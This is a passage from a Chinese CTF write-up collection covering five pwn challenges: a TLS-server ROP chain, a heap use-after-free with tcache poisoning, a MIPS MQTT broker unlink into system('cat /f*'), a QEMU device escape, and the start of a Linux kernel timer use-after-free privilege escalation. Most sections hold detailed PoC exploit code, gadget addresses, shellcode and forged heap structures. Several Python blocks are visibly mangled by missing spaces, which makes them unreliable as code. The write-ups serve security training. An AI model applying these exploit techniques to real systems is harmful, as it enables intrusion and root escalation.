easytl：ELF64静态链接OpenSSL 3.x与glibc，ET_EXEC非PIE，NX与canary开；bind <靶机地址>，accept后fork并alarm(80)，握手后跑6命令加密存储分发器。静态链接使gadget充裕、地址固定，但没有 `system` 可蹭，只能走syscall。子进程close(listen_fd)后0/1/2占用、SSL的socket是4， `open()` 最小编号是3，故 `read/write(4,..)` 对socket、 `read(3,..)` 读文件。

回调：info_cb 0x4030d5、psk_find_session_cb 0x402dbb、servername_cb 0x40320a；cur_ptr/cur_len在0x970f60/68，psk_buf/psk_len(=0x20)在0x970f40/48，sni_buf/sni_len在0x970f50/58。

漏洞函数0x40304d由info_cb在收alert时调用： `char buf[0x50]; memcpy(buf, cur_ptr, cur_len);`。loop事件（mask 0x2002）把cur_ptr/cur_len刷成当前缓冲区与sni_len；alert事件（mask 0x4004）在 `psk_buf && psk_len==0x20` 时调用它，源是PSK identity、长度仍是sni_len，二者都由攻击者控制，栈溢出成立，canary在0x58。

identity是pre_shared_key扩展（0x0029）里的长度前缀字节串，可含 `\x00` ；后门串 `1401518dc5d7641ccd41593a5d812410` 命中后用硬编码EC key造SSL_SESSION，binder必然失败并发alert。identity第33字节写 `\x00` ，使字符串处理截断在32字节。

利用链：CH1用group 0x1234与超长SNI触发HRR，记下 `cur_len=sni_len` ；CH2复用同SNI并带PSK与x25519 key_share，回调填好psk_buf后binder失败发alert并溢出；再爆破canary，两段ROP（栈上 `read(4,BSS,0x400)` 加 `pop rsp` ，.bss里open/read/write）取flag。

| 用途  | 地址  |
| --- | --- |
| pop rax; ret / pop rdi; ret | 0x5f6c9a / 0x4251bd |
| pop rsi; ret / pop rdx; ret | 0x5e9a79 / 0x52f0d2 |
| syscall; ret / pop rsp; ret | 0x76e706 / 0x4b9b60 |

### 3\. 解题过程

1.  CH1：supported_groups带0x1234与x25519，key_share只给0x1234，另带超长SNI；服务端无共享，回HRR要求x25519， `cur_len` 被loop事件写成sni_len。
    
2.  CH2：复用CH1的session_id（TLS1.3把它当握手指纹），SNI与CH1逐字节相同，key_share换成0x001d，并带后门identity的PSK（binder随意填48字节）；psk回调就位后binder失败发alert，进入0x40304d溢出。
    
3.  爆破canary：第k字节取sni_len=0x58+k，identity总长同值，已恢复字节写进 `identity[0x58:0x58+k]` ；判定是把socket读到超时，看整段是否以裸写的 `error` 结尾。fork子进程canary相同，可多线程并发，约40秒得到 `006afe94cd3ec0e5` 。
    
4.  拼identity：后门串0x20字节+ `\x00` +填充到0x58+canary+垃圾saved rbp+stage1，总长255且SNI长度必须同为255，否则cur_len与payload错位。
    
5.  stage1： `read(4,BSS,0x400)` 把后续blob读进.bss，再 `pop rsp; ret` 迁移到0x979000。
    
6.  stage2：blob里BSS+0放 `open("flag",0)` → `read(3,BSS+0x500,0x100)` → `write(4,..)` → `_exit` ，路径放在BSS+0x300随blob读入；用相对名 `flag` ，绝对路径会ENOENT。
    
7.  交互：CH2发出后立刻发0x400字节blob，数据先排在socket缓冲；回填后stage1的read正好取走它，pivot后stage2把flag写回socket。
    

### 4\. PoC

```python
import os, socket, struct

PSK = b'1401518dc5d7641ccd41593a5d812410'
POP_RAX, POP_RDI, POP_RSI, POP_RDX, POP_RSP, SYSCALL = 0x5f6c9a, 0x4251bd, 0x5e9a79, 0x52f0d2, 0x4b9b60, 0x76e706
BSS, PATH, FLAG = 0x979000, 0x979300, 0x979500
p16 = lambda x: struct.pack('>H', x)
p64 = lambda x: struct.pack('<Q', x)
ext = lambda t, d: p16(t) + p16(len(d)) + d

make_sni = lambda n: (b'a' * 63 + b'.') * (n // 64) + b'a' * (n % 64)

def ch(sid, sni, idn=None, group=0x1234):
    e = [ext(0x0000, p16(len(sni) + 3) + b'\x00' + p16(len(sni)) + sni),
         ext(0x000a, p16(4) + p16(0x1234) + p16(0x001d)),
         ext(0x000d, p16(4) + p16(0x0804) + p16(0x0403)),
         ext(0x002b, b'\x02\x03\x04'),
         ext(0x0033, p16(36) + p16(group) + p16(32) + os.urandom(32)),
         ext(0x002d, b'\x01\x01')]
    if idn:
        ent, bid = p16(len(idn)) + idn + b'\x00' * 4, os.urandom(48)
        e.append(ext(0x0029, p16(len(ent)) + ent + p16(len(bid) + 2) + p16(len(bid)) + bid))
    body = p16(0x0303) + os.urandom(32) + b' ' + sid + p16(2) + p16(0x1302) + b'\x01\x00' + p16(sum(map(len, e))) + b''.join(e)
    returnb'\x16\x03\x01' + p16(len(body) + 4) + b'\x01' + len(body).to_bytes(3, 'big') + body

def fire(h, p, idn, to=4.0):
    s = socket.create_connection((h, p), timeout=to)
    sid = os.urandom(32)
    sni = make_sni(len(idn))
    s.sendall(ch(sid, sni))
    n = struct.unpack('>H', s.recv(5)[3:5])[0]
    while n > 0:
        n -= len(s.recv(n))
    s.sendall(ch(sid, sni, idn, 0x001d))
    return s

def oracle(h, p, ln, guess):
    idn = bytearray(b'A' * (ln - 33))
    idn[0x58 - 33:0x58 - 33 + len(guess)] = guess
    try:
        s = fire(h, p, PSK + b'\x00' + bytes(idn), 3.0)
        s.settimeout(0.8)
        d = b''
        whileTrue:
            try:
                c = s.recv(65535)
            except socket.timeout:
                break
            ifnot c:
                break
            d += c
        return d.endswith(b'error')
    except OSError:
        returnFalse

def brute(h, p):
    c = b'\x00'
    for i in range(1, 8):
        c += bytes(next(b for b in range(256) if oracle(h, p, 0x58 + i, c + bytes([b]))))
    return c

def call(nr, a1, a2, a3):
    return (p64(POP_RAX) + p64(nr) + p64(POP_RDI) + p64(a1) + p64(POP_RSI)
            + p64(a2) + p64(POP_RDX) + p64(a3) + p64(SYSCALL))

canary = brute(HOST, PORT)
stage1 = call(0, 4, BSS, 0x400) + p64(POP_RSP) + p64(BSS)
idn = PSK + b'\x00' + b'A' * (0x58 - 0x21) + canary + b'B' * 8 + stage1
idn = idn.ljust(255, b'C')

chain = call(2, PATH, 0, 0) + call(0, 3, FLAG, 0x100) + call(1, 4, FLAG, 0x100) + call(60, 1, 0, 0)
blob = bytearray(0x400)
blob[:len(chain)] = chain
blob[0x300:0x305] = b'flag\0'
s = fire(HOST, PORT, idn)
s.sendall(bytes(blob))
print(s.recvall(timeout=3))
```

* * *

## PWN10-HESEUS

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 容器题 |
| 附件  | 无   |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

服务接收64行画布，按块元素校验后计算加权和，再从 `/proc/self/mem` 的 `struct_ptr + D` 读1字节。校验按C字符串语义取到NUL为止，行首写NUL即被当作空元素放行；加权和却按整行原始长度累加，NUL及其后字节照样计入：

```
D = Σ sign8(canvas[i]) × (i + 1)
addr = struct_ptr + D
```

行内字节可取-128～127，行尾换行权重10，正负权重组合可精确凑出任意偏移。读出的字节与画布、请求序号一起进入ChaCha20-Poly1305派生：两段12字节nonce由画布逐字节异或得到，ChaCha20分组生成二级密钥与nonce，Poly1305标签前12字节与密文异或，前8字节对文件长度-切片长度+1取模得 `OFFSET` ，后4字节低6位加1得 `LEN` 。

未知量只有那1字节：本地复现同一PRF，对0～255穷举预测 `(OFFSET, LEN)` 与远端返回比对即可反推内存字节，碰撞时换画布与序号重问。于是得到每请求1字节的任意读原语，同时把奖励 `HEX` 当作 `forgery` 的切片：9020次请求拼出26772/26784字节，缺失仅在ELF头与末尾节表，代码段完整。

运行版与伪造版不是同一次构建（输出函数分别在PIE `+0x1740` 与 `+0x1750` ），扩容分支的差异即漏洞：

```cpp
new = malloc(new_capacity);
memcpy(new, old, old_length);
free(old);                          // +0x1ac5
memcpy(old, input, input_length);   // +0x1ace 取回旧指针，+0x1b54 写入
```

`free` 后仍向旧指针写入，构成use-after-free；复制长度取整行原始长度，上限1023。`!`标记的逻辑长度受48字节限制，但标记中含NUL时复制仍按整行长度进行，所以一条241字节的`!`行既能越过容量阈值引发扩容与 `free` ，又能把240字节写进已释放的 `0x100` 大小类块。

地址链全靠相对读取： `struct+0` 为代码指针，减 `0x1740` 得PIE； `struct+0x20` 指向 `struct+0x30` ，减 `0x30` 得 `struct` ； `_dl_argv` （PIE `+0x5fd8` ）的 `+0x90` 指向初始栈auxv，保存的返回地址固定在 `auxv-0x268` ，该槽低2字节等于 `PIE+0x15f8` ，可验证推断。

### 3\. 解题过程

1.  以相对偏移读 `struct+0` 与 `struct+0x20` ，得到PIE与 `struct` 基址，再顺 `_dl_argv → auxv` 定位保存返回地址的栈槽。
    
2.  旧缓冲按 `0xf0` 申请，释放后落进 `0x100` 类。先发一条约200字节普通行，让同类多出一个空闲块，保证tcache计数足够。
    
3.  发触发行（241字节`!`行，标记中埋NUL）， `free(old)` 之后紧接的复制把旧块 `next` 改写为 `target ^ (old >> 12)` ，绕过glibc≥2.32的异或保护。
    
4.  再发两条240字节`!`行：第一条把旧块取回，第二条 `malloc` 直接返回编码出的栈地址，240字节负载落在保存返回地址之前。
    
5.  目标槽取 `saved_ret-8/24/40/56` 且16字节对齐处；`!`行过滤器拒绝小写字母、 `%` 与换行，编码后8字节不合法就重连换一个ASLR样本。
    
6.  负载以NUL加填充开头，接ROP： `pop rdi; pop rbp; ret` 、 `pop rsi; pop rbp; ret` 、 `pop rdx; ret` 设好mprotect(栈页, 0x2000, 7)参数，再跳 `mprotect@plt` （PIE `+0x1340` ）把栈页改为可执行。gadget取自ICU，基址由ld数据指针减 `0x24aa58` 得到，并逐个校验首字节。
    
7.  栈页可执行后转入紧随的shellcode。seccomp禁止 `execve` ，故直接ORW：先 `open("/flag")` ，失败再 `open("flag")` ，读入 `rsp-0x300` 后 `write` 到fd 1。
    

### 4\. PoC

```python
import re
import socket
import struct

REWARD = re.compile(rb'\[REWARD\] \+0x([0-9a-f]+) len=(\d+): ([0-9a-f]+)')

SHELLCODE = bytes.fromhex(
    '488d3d3a000000''31f6''b802000000''0f05'
    '488d3d30000000''31f6''b802000000''0f05'
    '89c7''488db42400fdffff''ba00010000''31c0''0f05'
    '89c2''bf01000000''b801000000''0f05'
    '2f666c616700''666c616700'
)

def row_for(delta):
    # 第i行权重i+1，从高权重向低权重贪心分解，末位微调使误差归零
    row = [0] * 64
    for i in range(63, -1, -1):
        w = i + 1
        step = max(-127, min(127, delta // w))
        row[i] = step & 0xff
        delta -= step * w
    assert delta == 0
    returnb'\n'.join(bytes([v]) for v in row)

class Oracle:
    def __init__(self, host, port, predict):
        self.s = socket.create_connection((host, port), timeout=5)
        self.s.settimeout(30)
        self.predict = predict          # predict(seq, byte) -> (OFFSET, LEN)
        self.seq = 0
        self.prompt()

    def prompt(self):
        buf = b''
        whileb'[INPUT]:\n'notin buf:
            buf += self.s.recv(65536)
        return buf

    def byte_at(self, delta):
        canvas = row_for(delta) + b'\n'
        for _ in range(4):
            self.seq += 1
            self.s.sendall(canvas)
            m = REWARD.search(self.prompt())
            off, ln = int(m[1], 16), int(m[2])
            cand = [b for b in range(256) if self.predict(self.seq, b) == (off, ln)]
            if len(cand) == 1:
                return cand[0]
        raise RuntimeError('ambiguous byte, retry with new canvas')

    def qword(self, delta):
        return sum(self.byte_at(delta + k) << (8 * k) for k in range(8))

def rop(pie, icu, page, g):
    p = lambda v: struct.pack('<Q', v)
    chain = p(icu + g[0]) + p(page) + p(0)
    chain += p(icu + g[1]) + p(0x2000) + p(0)
    chain += p(icu + g[2]) + p(7) + p(pie + 0x1340)
    returnb'\0' * 8 + b'A' * 16 + chain + SHELLCODE

def bang(data):
    # 标记埋NUL，逻辑长度不超过48，复制按整行240字节
    returnb'!' + b'\0' + data.ljust(239, b'A') + b'\n'

def exploit(oracle, saved_ret, pie, icu, old_chunk, g):
    page = saved_ret & ~0xfff
    target = next(saved_ret - b for b in (8, 24, 40, 56) if (saved_ret - b) % 16 == 0)
    oracle.s.sendall(b'B' * 199 + b'\n' + b'\n' * 63)      # 多造一个0x100空闲块
    oracle.s.sendall(bang(struct.pack('<Q', target ^ (old_chunk >> 12))))
    oracle.s.sendall(bang(b''))                            # 把旧块取回
    oracle.s.sendall(bang(rop(pie, icu, page, g)))         # malloc返回栈地址并写链
```

* * *

## PWN11-oldsvr

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 附件题 |
| 附件  | server、MIPS64大端uClibc 1.0.32、动态加载器 |
| 目标  | 无（离线附件） |

Flag：flag{1ec6896ee054f9cab370a5a8473c30ee}

### 2\. 题目分析

`server` 是裁剪过的MQTT broker，只实现CONNECT、SUBSCRIBE、UNSUBSCRIBE、PUBLISH、PINGREQ，订阅表固定14槽，每槽存主题指针、payload指针与长度。报文为1字节定长头加7位一组的剩余长度，主题名前带2字节长度，解析出的长度既用于 `malloc` 也直接当 `memcpy` 字节数。认证只在CONNECT做一次，之后报文不再校验身份，堆上状态可跨报文反复利用。

程序PIE+NX、无Canary； `checksec` 报Full RELRO，但 `GNU_RELRO` 只覆盖 `0x1ffe0~0x20000` ， `free@GOT=PIE+0x20220` 、 `malloc@GOT=PIE+0x202b0` 落在其后的可写段。uClibc堆无tcache与safe-linking，空闲块靠双向链表管理，unlink校验 `fd->bk==P` 且 `bk->fd==P` ，伪造块头让两个指针都指回同一处即可通过，并把任意地址写成 `fd` ；大端平台下回包长度、块头与伪造指针都按大端64位填写。

释放路径分两条。短消息（ `0<payload_len<=32` ）在 `0x37d8` 先按 `topic_len+payload_len` 申请临时块并立刻释放，再 `free(slot->payload)` ，最后仍用这个已释放指针拼回包，前8字节正是uClibc写入的空闲链表 `fd` ，堆地址随响应外泄。长消息把 `free(slot->payload)` 推到最后，块在回包期间存活，可当作溢出的相邻目标。槽满时 `0x3e80` 只 `malloc` 主题名，不写表也不释放，可用来推移堆布局。

溢出点在回包构造函数 `0x2610` ，总长存进有符号16位：

```
int16_t total = payload_len + 14 + 2;
out = malloc(total);
memcpy(out + 2 + 14, payload, payload_len);
```

`payload_len=65520` 时 `total=(int16_t)65536=0` ， `malloc(0)` 只返回最小块， `memcpy` 仍写65520字节，分配尺寸与拷贝尺寸脱钩。偏移以复制目的地址 `D` 为基准，越界数据从相邻块头开始覆盖：

| 偏移  | 写入值 | 用途  |
| --- | --- | --- |
| `D+0x06` | `0xb1` | 保留别名块的size |
| `D+0x1e` | `T-0x18` | 伪造前驱块的 `fd` |
| `D+0x26` | `T-0x10` | 伪造前驱块的 `bk` |
| `D+0xae` | `0xa0` | victim的 `prev_size` |
| `D+0xb6` | `0xb0` | victim的size，清除 `PREV_INUSE` |
| `D+0x166` | `0x21` | 让大消息源块释放时进小块链表 |
| `D+0x186` | `0x21` | 保持相邻块状态通过释放检查 |

`T = PIE+0x20368` 是第一个普通槽的payload指针字段。victim块头在 `D+0xae` ， `prev_size=0xa0` 使前驱算成 `P=D+0x0e` （别名消息用户区），而 `*T` 本就等于 `P` ；令 `fd=T-0x18` 、 `bk=T-0x10` ，两次检查读到的都是 `*T=P` ，unlink通过后 `*T` 被写成 `T-0x18` ，槽指针移到BSS前方。

### 3\. 解题过程

1.  认证：Client ID为 `QWB_Client` ，用户名逐字节异或 `0x1d` 后得 `QWB2026_Admin` ；密码做MD5后用 `strncmp(digest, expected, 16)` 校验，预期摘要第3字节为NUL，比较提前结束，只需MD5前3字节为 `52 2a 00` 。枚举得 `password=1540124` ，CONNECT返回 `20 02 00 00` 。
    
2.  订阅 `QWB2026_News` 并连续6次PING使计数为6，再向该主题发24字节消息，回包用悬空指针读出堆指针（ `PIE+0x22120` 附近），按 `(leak-0x22000) & ~0xfff` 得PIE基址。
    
3.  槽耗尽整理堆：远程额外订阅100次，本地QEMU用2000次，把后续分配位置推到可预测处。
    
4.  向第一个主题发73、160字节、第二个发160字节切出 `0x60` 空洞，再向第一个主题发 `payload_len=65520` 的消息触发截断溢出，按上表写入伪造块头、前驱指针与victim size。
    
5.  取消订阅victim触发unlink， `*T` 被写成 `T-0x18` 。
    
6.  再次PUBLISH第一个主题，按被改写的指针做 `memset` / `memcpy` ，把伪造槽记录写进BSS：槽1 topic指向 `cat /f*` 、payload为 `free@GOT` ，槽2 topic指向 `malloc@GOT` 、payload为 `1` 。
    
7.  用槽1向GOT连写80字节： `free` 换成write桩 `PIE+0x6d40` ， `memset` 换成直接返回的 `PIE+0x30c0` ， `memcmp` 换成剩余长度解析函数 `PIE+0x42f4` （第二字节为0时返回0，零长度主题即可匹配）。
    
8.  零主题取消订阅8字节选中槽2，两次释放分别以GOT地址和 `1` 为 `fd` 调用 `write` ，回包带回 `malloc@libc=0xfff7f5eca0` ， `libc_base=malloc-0x5dca0=0xfff7f01000` 。
    
9.  同一连接内用零主题PUBLISH把 `free@GOT` 改成 `libc_base+0x65370` （ `system` ），再取消订阅零主题， `free(topic)` 的实参指向BSS里的 `cat /f*` ，等价 `system("cat /f*")` ，回包带出flag。
    

MIPS64的 `jr $ra` 链需先控 `$sp` ，而泄露只有PIE与libc、溢出落在堆上，故改用GOT级复用，一次绝对地址写入即可完成函数替换。

### 4\. PoC

```css
import socket
import struct

def enc_len(n):
    out = b''
    whileTrue:
        low, n = n & 0x7f, n >> 7
        out += bytes([low | (0x80if n else0)])
        ifnot n:
            return out

def pkt(typ, body):
    return bytes([typ]) + enc_len(len(body)) + body

def s16(b):
    return struct.pack('>H', len(b)) + b

def subscribe(mid, topic):
    return pkt(0x82, struct.pack('>H', mid) + s16(topic) + b'\x00')

def unsubscribe(mid, topic):
    return pkt(0xa2, struct.pack('>H', mid) + s16(topic))

def publish(topic, payload):
    return pkt(0x30, s16(topic) + payload)

def build_overflow(pie, payload):
    # 偏移以复制目的地址 D 为基准，即 payload 起点
    T = pie + 0x20368
    fields = [(0x06, 0xb1), (0x1e, T - 0x18), (0x26, T - 0x10),
              (0xae, 0xa0), (0xb6, 0xb0), (0x166, 0x21), (0x186, 0x21)]
    buf = bytearray(payload)
    for off, val in fields:
        buf[off:off + 8] = struct.pack('>Q', val)
    return bytes(buf)

def exploit(s, pie, leak_malloc):
    s.sendall(subscribe(1, b'/a') + subscribe(2, b'/b'))
    s.sendall(publish(b'/a', b'A' * 73))
    s.sendall(publish(b'/a', b'B' * 160) + publish(b'/b', b'C' * 160))
    s.sendall(publish(b'/a', build_overflow(pie, b'D' * 65520)))
    s.sendall(unsubscribe(3, b'/b'))              # 触发 unlink，*T 写成 T-0x18
    s.sendall(publish(b'/a', b'E' * 8))           # 伪槽记录写入 BSS
    s.sendall(publish(b'/a', b'F' * 80))          # 改 free/memset/memcmp 的 GOT
    s.sendall(unsubscribe(4, b''))                # 零主题：write 桩泄 malloc@libc
    s.sendall(publish(b'', struct.pack('>Q', leak_malloc - 0x5dca0 + 0x65370)))
    s.sendall(unsubscribe(5, b''))                # free("cat /f*") -> system
```

* * *

## PWN12-ez_qemu

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 混合题（附件+容器） |
| 附件  | ez_qemu_39e1895599f72e453332331ab83b08eb.zip |
| 目标  | 从guest串口root shell逃逸到宿主，读取/tmp/flag_f |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

xinetd每来一个连接就fork一次 `run.sh` ，用 `-M q35 -m 512M -accel tcg -no-reboot -display none -monitor none -serial stdio` 启动改过的QEMU，挂 `ctf-nic` 、 `ctf-watchdog` 、 `ctf-audio` 、 `ctf-logger` 、 `ctf-msg` 五个设备，stderr单独重定向到日志。因此PIE基址、堆布局、定时器对象地址每个连接都不同，exp不能跨连接复用地址；TCG只有一个vCPU线程，guest的MMIO回调都在该线程串行执行，这决定了后面malloc arena的选择。QEMU以ctf用户运行，而 `/tmp/flag_f` 是root:ctf 740，只要能在宿主进程里执行一条命令即可读flag。

guest是BusyBox init加root shell，可读 `/proc/self/pagemap` 、可访问 `/sys/bus/pci/devices/*/resource0` ，但没有编译器和完整libc，exp必须是freestanding的静态ELF，经串口base64+gzip上传，用 `uudecode` 、 `gzip -dc` 还原。

设备功能与偏移：

| 设备  | 作用  |
| --- | --- |
| `ctf-nic` | 按DMA描述符向guest物理地址写数据，落到BAR区间即触发其他设备的MMIO |
| `ctf-watchdog` | 分配/释放0x58字节定时器对象，reset只换对象不停表 |
| `ctf-audio` | 分配/释放0x58缓冲，可从guest内存拷入数据 |
| `ctf-logger` | MMIO回调栈上开0x1000缓冲，按偏移DMA回guest，越界读可泄露PIE |
| `ctf-msg` | 对象创建/释放/调用，本链未使用 |

所有设备的BAR0都是0x1000，回调先取 `addr & ~3` 定位寄存器，故每次写入都是4字节寄存器写。 `-device` 顺序即槽位：nic为03.0、watchdog为03.1、audio为03.2、logger为03.3。各设备realize时把同一个全局上下文指针存到 `dev+0xb10` ，上下文第0项就是watchdog的0x58定时器对象，NIC的RX收尾正是从它取回调。

**watchdog**： `+0x10` reset分配新的0x58对象并 `g_free` 旧对象， `+0x20` 写message并装载定时器， `+0x28` 释放对象并把共享上下文里的指针置空。对象布局为 `+0x00` QEMUTimer指针、 `+0x08` 起0x40字节message、 `+0x48` 回调指针、 `+0x50` 状态字；reset全程没有 `timer_del` ，已装载的QEMUTimer仍指向旧块，默认1000毫秒超时，构成UAF。

**audio**： `+0x00` 分配0x58缓冲， `+0x04` 释放并置空， `+0x08/+0x0c` 为64位guest物理源地址， `+0x10` 为最大长度， `+0x14` commit从源地址拷 `min(len, 0x50)` 字节到缓冲，正好覆盖块首到块尾。

**logger**： `+0x00/+0x04` 为目的物理地址， `+0x08` 为宿主缓冲内偏移， `+0x0c` 为长度， `+0x10` 触发。回调栈上缓冲0x1000字节，长度用 `0x1000 - off` 取余量； `off` 为32位无符号，取 `0x1010` 时余量下溢成极大值，min的结果就是 `len` ，源指针越过缓冲末尾，栈内容被DMA回guest。

**nic**： `+0x10/+0x14` 为RX描述符物理地址， `+0x1c` 触发RX。描述符长0x28：

```cpp
struct desc {
    uint64_t a0; uint32_t l0; uint32_t r0;
    uint64_t a1; uint32_t l1; uint32_t r1;
    uint64_t st;
};
```

RX从内部缓冲向 `a0` 、 `a1` 各写 `l0` 、 `l1` 字节（单段上限0x800），最后向 `st` 写4字节值1，三个地址都是guest物理地址，落在BAR区间就被转发成MMIO写。RX入口先把 `ctx->timer` 缓存到栈上，DMA与中断处理期间不再回读，收尾直接用缓存指针 `call [obj+0x48]` ，参数固定为 `obj+8` 。

于是时序为：在vCPU线程对watchdog做 `+0x10` reset，让新对象落在该线程的arena；用audio做7次alloc/free填满 `0x60` 类的tcache；RX入口缓存旧定时器；描述符依次写watchdog `+0x28` （释放）、audio `+0x00` （取回同一块）、audio `+0x14` （拷入0x50字节，覆盖 `+0x08` 的命令串与 `+0x48` 的回调）。释放、复用、覆盖必须落在同一次RX回调内且 `st` 在 `a0` 、 `a1` 之后，否则回调仍指向原函数，或旧定时器在覆盖前到期。 `g_malloc0` 走 `calloc` 不取tcache， `g_free` 在tcache满时进fastbin，所以第8次释放才进入fastbin、被下一次 `calloc` 取回，7是tcache每类的槽数。

### 3\. 解题过程

1.  枚举四个BAR， `mmap` 其 `resource0` ，向配置空间 `+0x04` 写 `command |= 7` 打开MMIO与bus master； `mmap` 一页匿名内存并 `mlock` ，通过pagemap取物理地址。这一页同时充当logger的DMA目的、audio的DMA源与NIC描述符存放处：
    

```
uint64_t entry;
pread(fd, &entry, 8, (ptr >> 12) * 8);
pa = ((entry & ((1ULL << 55) - 1)) << 12) | (ptr & 0xfff);
```

2.  向logger写 `{pa, 0x1010, 0x80, 1}` 触发越界拷贝，从guest页 `+0x08` 读出返回地址，校验低12位为 `0x2c7` 后 `base = ret - 0x4132c7` ， `system_plt = base + 0x2e2c90` 。
    
3.  清空guest页， `+0x08` 写 `/bin/cat /tmp/flag_f` ， `+0x48` 写 `system_plt` ，audio配好源地址与 `0x50` 长度，commit时把命令与回调拷进定时器块。
    
4.  对watchdog执行 `+0x10` reset（新对象落vCPU arena），audio做7次alloc/free填满tcache。
    
5.  在guest页 `+0x100` 构造描述符，把其物理地址写入NIC `+0x10/+0x14` ，写NIC `+0x1c` 触发RX：
    

```rust
d->a0 = bar[1] + 0x28;  d->l0 = 4;   // watchdog free
d->a1 = bar[2];         d->l1 = 4;   // audio alloc
d->st = bar[2] + 0x14;               // audio commit
```

6.  RX收尾用缓存的旧指针取 `+0x48` 得到 `system_plt` ，以已变成命令串的 `+0x08` 为唯一参数调用，flag经QEMU的stdout（即串口socket）回显。
    
7.  上传：宿主侧 `gzip -9` 压缩、base64按76列切行包进heredoc，guest侧 `uudecode` 、 `gzip -dc` 、 `chmod +x` 后运行，每行之间留约25ms避免ttyS0丢字符；收尾在guest执行 `poweroff -f` ，否则QEMU空跑到600秒超时。
    

### 4\. PoC

```python
import base64
import gzip
import socket
import time

def upload_lines(binary):
    packed = gzip.compress(binary, compresslevel=9, mtime=0)
    encoded = base64.b64encode(packed).decode()
    lines = ["cat > /e.b64 <<'EOF'", 'begin-base64 644 /e.gz']
    lines += [encoded[i:i + 76] for i in range(0, len(encoded), 76)]
    lines += ['====', 'EOF', 'uudecode /e.b64', 'gzip -dc /e.gz > /e',
              'chmod +x /e', '/e']
    return lines

def run(host, port, binary, flag_cmd=b'poweroff -f\n'):
    s = socket.create_connection((host, port), timeout=25)
    s.settimeout(0.3)
    buf = b''

    def wait_for(marker, timeout=60):
        nonlocal buf
        end = time.monotonic() + timeout
        while marker notin buf and time.monotonic() < end:
            try:
                buf += s.recv(16384)
            except socket.timeout:
                pass
        return buf

    wait_for(b'/ # ')
    for line in upload_lines(binary):
        s.sendall(line.encode() + b'\n')
        time.sleep(0.025)                 # ttyS0 队列很浅，逐行发送
    wait_for(b'[+] RX finished')
    s.sendall(flag_cmd)                   # 读 flag 后关机，让 QEMU 立即退出
    time.sleep(0.5)
    print(buf.decode(errors='replace'))
    s.close()
```

* * *

## PWN13-CanonicoPWN

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | PWN |
| 形态  | 容器题，无附件 |
| 附件  | 无   |
| 目标  | nc ，guest内核提权 |

Flag：flag{动态容器已脱敏}

### 2\. 题目分析

环境为Ubuntu 26.04 LTS的QEMU虚拟机，串口控制台直落 `ctf` （uid 1000、 `CapEff` 为0）， `/flag` 指向 `/dev/vda` （ `0400 root:root` ），只能内核提权后读块设备。 `/init` 关掉了userns、io_uring、perf与unprivileged BPF， `kptr_restrict=2` 、 `dmesg_restrict=1` ，cmdline带 `oops=panic panic=-1` ，无setuid文件与自定义设备，攻击面只剩通用syscall。

内核是自编译的 `7.0.0-39-generic` （源码 `-39.39` ）， `/proc/kallsyms` 地址归零但符号名可读，与官方 `-39.39` 的 `System.map` 比对仅差构建项。修复补丁 `acb03d388181` （exec: Cleanup POSIX timers right after de_thread）首次出现在 `7.0.0-41.41` ，目标版本缺失。

漏洞：非leader线程 `execve()` 时 `de_thread()` 先完成TID交换并release_task(旧leader)，而 `posix_cpu_timers_exit()` 在 `begin_new_exec()` 里排在 `exec_mmap()` 等可失败操作之后。 `exec_mmap()` 的 `mmap_read_lock_killable` 被 `SIGKILL` 打断后任务已过point of no return只能退出，清理不执行。退出路径 `exit_itimers()` → `posix_cpu_timer_del()` 中 `pid_task()` 查不到任务就 `goto out` ，跳过 `timerqueue_del()` ，而 `put_pid()` 与 `kfree_rcu()` 照常执行， `struct cpu_timer.node` 仍留在存活任务的timerqueue里，队列本身不持有引用计数。父进程回收僵尸时 `__exit_signal()` → `cleanup_timerqueue()` 再摘一次，对已回收slab执行 `rb_erase()` 。

BTF核对的偏移：

| 字段  | 偏移  |
| --- | --- |
| `sizeof(struct k_itimer)` | `0x180` |
| `k_itimer.it.cpu` | `0xe0` |
| `cpu_timer.node/head/elist/handling` | `0x0/0x20/0x30/0x48`<br><br>（ `0xe0/0x100/0x110/0x128` ） |
| CPUCLOCK_SCHED tqhead | `0xca0` |
| `task_struct.cred` | `0xd00` |

窗口须在TID交换后、 `exec_mmap()` 拿到 `mmap_lock` 前发 `SIGKILL` ； `tgkill` 返回 `ESRCH` 即交换完成，50000个单页VMA与3个同 `mm` helper把锁占满，killer才插得进去。

父进程 `waitid(WNOWAIT)` 留住僵尸，279个filler与392个候选timer填RCU sheaf，回收后节点残留在worker树里；释放候选清空slab、PCP预热，再用64000匿名页与AIO ring页回收该页。

oracle：worker耗CPU触发 `collect_posix_cputimers()` ，内核写 `handling=current` （ `object+0x128` ），worker在伪造 `it_lock` 上自旋；扫描页内指针得到 `task_struct` ，解锁后 `list_del_init(&ctmr->elist)` 写出direct map地址， `kernel_object=elist-0x110` 。

覆盖cred：页内伪造

```
A{parent=C, left=task+0xd00, head=task+0xca0}
C{parent=M, right=A}  M{left=C+8, head=task+0xca0}
```

第二轮 `collect_timerqueue()` 处理A时 `rb_erase` 执行 `tmp->__rb_parent_color=pc` ， `tmp=A.left=&task->cred` 、 `pc=C=fake_cred` ，即 `task->cred=fake_cred` ；处理M把 `C+8` 写0清uid/gid。伪造cred的euid/fsgid为0、capability全1， `security` 指向假AppArmor label， `user_ns` 的level置1。

适配：guest开了 `la57` ，direct map在 `ff11...`，判据改为 `(v>>56)==0xff` ； `/tmp` 是 `nosuid` ，暂存目录用 `/home/ctf` 前先 `chmod 777` ，否则能力被 `cap_capable()` 拒绝；喷射用 `io_setup` ring地址跳过64000次 `mremap` 。

### 3\. 解题过程

1.  侦察：读 `/proc/version` 、 `/proc/config.gz` 、 `/proc/kallsyms` 与 `/proc/devices` ，确认 `7.0.0-39-generic` 、无自定义设备、 `CapEff=0` 。
    
2.  取官方 `linux-image-unsigned` 与 `linux-modules` 包，用 `vmlinux-to-elf` 还原带符号vmlinux，解析`.BTF` 核对偏移，按CVE-2026-98260展开。
    
